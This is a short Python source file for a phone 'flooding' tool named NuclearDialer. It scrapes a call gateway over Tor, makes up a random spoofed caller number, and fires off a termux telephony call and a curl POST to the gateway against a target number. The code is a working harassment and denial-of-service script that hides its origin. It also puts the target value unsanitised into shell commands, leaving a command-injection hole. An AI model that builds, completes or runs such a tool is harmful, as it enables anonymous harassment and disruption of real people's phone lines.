import subprocess  
import random  
from core.tor_scraper import TorScraper  

class NuclearDialer:  
    def __init__(self):  
        self.scraper = TorScraper()  

    def detonate(self, target):  
        # DYNAMIC GATEWAY SCRAPE (NO FILES)  
        gateway = self.scraper.get_gateway(target[:2])  
        # SPOOFED NUMBER (RAM-ONLY)  
        spoofed_num = f"+{random.randint(1,999)}{random.randint(1000,9999)}{random.randint(100000,999999)}"  
        # DUAL FLOOD (TERMUX + SIP)  
        subprocess.Popen(  
            f"termux-telephony-call {target}",  
            shell=True,  
            stdout=subprocess.DEVNULL  
        )  
        subprocess.Popen(  
            f"curl -s -X POST {gateway} --data 'to={target}&from={spoofed_num}'",  
            shell=True,  
            stdout=subprocess.DEVNULL  
        )  
